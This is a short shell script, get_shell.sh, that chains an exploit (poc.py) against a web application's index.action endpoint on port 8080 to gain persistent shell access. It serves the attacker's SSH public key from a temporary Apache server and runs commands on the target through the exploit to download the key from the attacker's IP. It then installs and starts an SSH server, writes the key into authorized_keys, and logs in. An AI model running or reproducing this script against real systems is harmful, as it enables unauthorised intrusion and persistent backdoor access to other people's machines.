#!/usr/bin/env sh
# add the ssh key of attacker into target's authorized_keys to enable ssh link without key
# TODO: only executed this commands line by line manually, should test whether we can directly run ./get_shell.sh to run it.

if [ $# != 2 ] ; then
    echo "USAGE: $0 <target-ip> <attacker-ip>"
    echo "EXAMPLE: $0 192.168.101.3 192.168.101.4"
    exit 1;
fi

TARGET_IP=$1
ATTACK_IP=$2

# transfer public key to target machine
apt-get install apache2
service apache2 start
cp ~/.ssh/id_rsa.pub /var/www/html/key.txt
python3 poc.py http://$TARGET_IP:8080/index.action wget http://$ATTACK_IP:80/key.txt
service apache2 stop

# start the ssh service of target machine
python3 poc.py http://$TARGET_IP:8080/index.action apt-get install -y openssh-server
python3 poc.py http://$TARGET_IP:8080/index.action service ssh start
python3 poc.py http://$TARGET_IP:8080/index.action mkdir ~/.ssh
# NOTE: There are various ways to achieve this. Some may filter the "~"character and should find the absolute root to it
python3 poc.py http://$TARGET_IP:8080/index.action cp key.txt ~/.ssh/authorized_keys

# access to target shell successfully
ssh $TARGET_IP
